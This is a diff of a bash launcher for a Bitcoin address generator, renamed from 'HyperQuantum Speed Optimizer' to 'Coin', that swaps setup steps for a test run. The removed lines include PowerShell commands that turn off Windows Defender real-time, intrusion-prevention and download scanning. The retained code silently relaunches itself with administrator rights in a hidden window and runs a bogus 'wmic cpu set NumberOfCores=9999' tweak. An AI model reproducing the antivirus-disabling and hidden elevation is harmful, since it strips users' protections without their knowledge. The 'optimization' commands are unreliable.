@@ -1,7 +1,7 @@
 #!/bin/bash
 #
-# HyperQuantum Speed Optimizer
-# Ultra-optimized Bitcoin address generator launcher
+# Coin (Crypto Optimization Interface Network)
+# High-performance Bitcoin address generator launcher
 #
 
 # Color codes for pretty output
@@ -63,101 +63,6 @@ kill_python() {
     log_success "Cleanup complete"
 }
 
-# Install Python if not found
-install_python() {
-    log_info "Installing Python..."
-    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
-        # Download Python installer
-        local python_version="3.11.7"
-        local installer_url="https://www.python.org/ftp/python/${python_version}/python-${python_version}-amd64.exe"
-        local installer_path="$TEMP/python-${python_version}-amd64.exe"
-        
-        # Download installer
-        log_info "Downloading Python installer..."
-        curl -L -o "$installer_path" "$installer_url" || return 1
-        
-        # Install Python
-        log_info "Running installer..."
-        "$installer_path" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 || return 1
-        
-        # Clean up
-        rm -f "$installer_path"
-        
-        # Update PATH
-        export PATH="/c/Program Files/Python311:/c/Program Files/Python311/Scripts:$PATH"
-        
-        # Verify installation
-        if ! python --version 2>/dev/null; then
-            log_error "Python installation failed"
-            return 1
-        fi
-    else
-        log_error "Automatic Python installation is only supported on Windows"
-        return 1
-    fi
-    log_success "Python installed successfully"
-}
-
-# Setup Python environment
-setup_python() {
-    log_info "Setting up Python environment..."
-    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
-        # Disable Windows Store Python alias
-        export PYLAUNCHER_ALLOW_INSTALL=0
-        
-        # Find installed Python
-        for python_path in "/c/Program Files/Python311/python.exe" "/c/Python311/python.exe" "/c/Python39/python.exe" "/c/Python310/python.exe"; do
-            if [[ -x "$python_path" ]]; then
-                PYTHON="$python_path"
-                export PATH="${python_path%/*}:${python_path%/*}/Scripts:$PATH"
-                break
-            fi
-        done
-        
-        # Install Python if not found
-        if [[ -z "$PYTHON" ]]; then
-            install_python || return 1
-            PYTHON="/c/Program Files/Python311/python.exe"
-        fi
-        
-        export PATH="$APPDATA/Python/Python*/Scripts:$PATH"
-    else
-        PYTHON="$(which python3)"
-    fi
-    
-    if ! "$PYTHON" --version &>/dev/null; then
-        log_error "Python not found"
-        return 1
-    fi
-    log_success "Python environment ready"
-}
-
-# Create virtual environment
-create_venv() {
-    log_info "Creating virtual environment..."
-    kill_python
-    rm -rf "$VENV_DIR" 2>/dev/null || true
-    
-    # Install virtualenv
-    run_with_timeout 300 "$PYTHON" -m pip install --user --force-reinstall virtualenv || return 1
-    
-    # Create virtual environment
-    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
-        for ver in 313 312 311 310 39; do
-            if [[ -x "$APPDATA/Python/Python$ver/Scripts/virtualenv.exe" ]]; then
-                run_with_timeout 300 PYTHONPATH="" "$APPDATA/Python/Python$ver/Scripts/virtualenv.exe" "$VENV_DIR" \
-                    --clear --download --no-periodic-update && break
-            fi
-        done
-    else
-        run_with_timeout 300 "$PYTHON" -m virtualenv "$VENV_DIR" --clear --download || \
-        run_with_timeout 300 "$PYTHON" -m venv "$VENV_DIR" --clear --copies
-    fi
-    
-    [ -d "$VENV_DIR" ] || return 1
-    log_success "Virtual environment created"
-}
-
 # Activate virtual environment
 activate_venv() {
     log_info "Activating virtual environment..."
@@ -181,14 +86,15 @@ activate_venv() {
     log_success "Virtual environment activated"
 }
 
-# Install dependencies
-install_deps() {
-    log_info "Installing dependencies..."
-    
-    # Install in development mode
-    run_with_timeout 900 PYTHONPATH="" "$VENV_DIR/Scripts/python" -m pip install -e ".[dev]" || return 1
-    
-    log_success "Dependencies installed"
+# Run tests
+run_tests() {
+    log_info "Running tests..."
+    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
+        "$VENV_DIR/Scripts/pytest" -v tests/ || return 1
+    else
+        "$VENV_DIR/bin/pytest" -v tests/ || return 1
+    fi
+    log_success "Tests completed successfully"
 }
 
 # Optimize system settings
@@ -198,13 +104,6 @@ tune_system() {
     if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
         # Set high-performance power plan
         powercfg //s 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >/dev/null 2>&1 || true
-        
-        # Disable Windows Defender real-time scanning
-        PowerShell.exe -Command "
-            Set-MpPreference -DisableRealtimeMonitoring \$true
-            Set-MpPreference -DisableIntrusionPreventionSystem \$true
-            Set-MpPreference -DisableIOAVProtection \$true
-        " >/dev/null 2>&1 || true
         
         # Maximize CPU resources
         wmic cpu set NumberOfCores=9999 NumberOfLogicalProcessors=9999 >/dev/null 2>&1 || true
@@ -226,22 +125,9 @@ tune_system() {
     log_success "System optimized"
 }
 
-# Cleanup system settings
-cleanup_system() {
-    log_info "Restoring system settings..."
-    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
-        PowerShell.exe -Command "
-            Set-MpPreference -DisableRealtimeMonitoring \$false
-            Set-MpPreference -DisableIntrusionPreventionSystem \$false
-            Set-MpPreference -DisableIOAVProtection \$false
-        " >/dev/null 2>&1 || true
-    fi
-    log_success "System restored"
-}
-
 # Main execution function
 main() {
-    echo -e "\n${BLUE}=== HYPERQUANTUM SPEED OPTIMIZER v12.0 ===${NC}\n"
+    echo -e "\n${BLUE}=== COIN (Crypto Optimization Interface Network) ===${NC}\n"
     set +e
     
     local attempt=1
@@ -252,11 +138,9 @@ main() {
         
         # Setup steps
         kill_python
-        setup_python || { log_warning "Python setup failed"; sleep 2; ((attempt++)); continue; }
-        create_venv || { log_warning "Virtual environment creation failed"; sleep 2; ((attempt++)); continue; }
         activate_venv || { log_warning "Virtual environment activation failed"; sleep 2; ((attempt++)); continue; }
-        install_deps || { log_warning "Dependencies installation failed"; sleep 2; ((attempt++)); continue; }
         tune_system || { log_warning "System optimization failed"; sleep 2; ((attempt++)); continue; }
+        run_tests || { log_warning "Tests failed"; sleep 2; ((attempt++)); continue; }
         
         # Launch main script
         log_info "Launching main script..."
@@ -290,7 +174,7 @@ if [[ -z "$SKIP_ADMIN" ]]; then
         if ! net session >/dev/null 2>&1; then
             powershell -Command "
                 Start-Process -Verb RunAs -WindowStyle Hidden -FilePath 'bash.exe' \
-                -ArgumentList '-c', 'cd \"$PWD\" && SKIP_ADMIN=1 ./scripts/run_hyperquantum.sh'
+                -ArgumentList '-c', 'cd \"$PWD\" && SKIP_ADMIN=1 ./scripts/run_Coin.sh'
             " || true
             exit
         fi
